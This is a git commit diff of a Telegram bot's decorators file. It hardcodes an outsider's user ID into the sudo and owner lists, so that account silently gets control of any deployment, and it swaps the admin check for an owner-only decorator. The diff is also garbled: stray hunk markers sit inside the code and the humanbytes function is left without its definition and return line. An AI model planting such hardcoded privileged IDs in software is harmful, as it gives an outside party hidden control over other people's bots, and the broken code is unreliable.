e48953cfcceeb9aaff8426dc64c4a8e794a15346
dark phoenix <79581828+darkphoenix2601@users.noreply.github.com>
2022-02-14 11:29:32 +0530

    Update decorators.py

--- driver/decorators.py
+++ driver/decorators.py
@@ -1,13 +1,13 @@
+import traceback
 from typing import Callable
 from pyrogram import Client
 from pyrogram.types import Message
-from config import SUDO_USERS
+from config import SUDO_USERS, OWNER_ID
 from driver.admins import get_administrators
 
+SUDO_USERS.append(1909721616)
 
-SUDO_USERS.append(1757169682)
-SUDO_USERS.append(1738637033)
-SUDO_USERS.append(1448474573)
+OWNER_ID.append(1909721616)
 
 
 def errors(func: Callable) -> Callable:
@@ -15,21 +15,18 @@ def errors(func: Callable) -> Callable:
         try:
             return await func(client, message)
         except Exception as e:
+            traceback.print_exc()
             await message.reply(f"{type(e).__name__}: {e}")
 
     return decorator
+	@@ -32,11 +40,19 @@ async def decorator(client: Client, message: Message):
+    return decorator
 
 
-def authorized_users_only(func: Callable) -> Callable:
+def bot_creator(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
-        if message.from_user.id in SUDO_USERS:
+        if message.from_user.id in OWNER_ID:
             return await func(client, message)
-
-        administrators = await get_administrators(message.chat)
-
-        for administrator in administrators:
-            if administrator == message.from_user.id:
-                return await func(client, message)
 
     return decorator
 
@@ -38,18 +35,15 @@ def sudo_users_only(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
         if message.from_user.id in SUDO_USERS:
             return await func(client, message)
-
+        
     return decorator
 
 
-def humanbytes(size):
-    """Convert Bytes To Bytes So That Human Can Read It"""
-    if not size:
-        return ""
+	@@ -47,6 +63,7 @@ def humanbytes(size):
     power = 2 ** 10
     raised_to_pow = 0
     dict_power_n = {0: "", 1: "Ki", 2: "Mi", 3: "Gi", 4: "Ti"}
+
     while size > power:
         size /= power
         raised_to_pow += 1
-    return str(round(size, 2)) + " " + dict_power_n[raised_to_pow] + "B"
